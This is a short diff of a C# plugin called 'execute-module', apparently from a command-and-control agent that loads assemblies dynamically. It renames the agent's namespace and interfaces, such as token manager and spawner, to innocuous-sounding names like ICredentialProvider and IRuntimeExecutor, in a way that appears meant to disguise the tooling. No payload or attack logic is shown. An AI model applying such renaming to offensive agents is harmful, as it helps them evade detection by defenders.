@@ -1,6 +1,6 @@
-﻿using Agent.Interfaces;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Contracts;
+using Workflow.Models;
+using Workflow.Utilities;
 using execute_module;
 using System.Collections.Concurrent;
 using System.IO;
@@ -8,21 +8,21 @@ using System.Reflection;
 using System.Runtime.Loader;
 using System.Text.Json;
 
-namespace Agent
+namespace Workflow
 {
-    public class Plugin : IFilePlugin
+    public class Plugin : IFileModule
     {
         public string Name => "execute-module";
-        private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
-        private IAgentConfig config { get; set; }
+        private IDataBroker messageManager { get; set; }
+        private ICredentialProvider tokenManager { get; set; }
+        private IServiceConfig config { get; set; }
         private AssemblyLoadContext assemblyLoadContext = new AssemblyLoadContext(Misc.RandomString(10));
         //Name, Module
         private Dictionary<string, ExecModuleArgs> module_tasks = new Dictionary<string, ExecModuleArgs>();
         private List<AthenaModule> modules = new List<AthenaModule>();
         private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
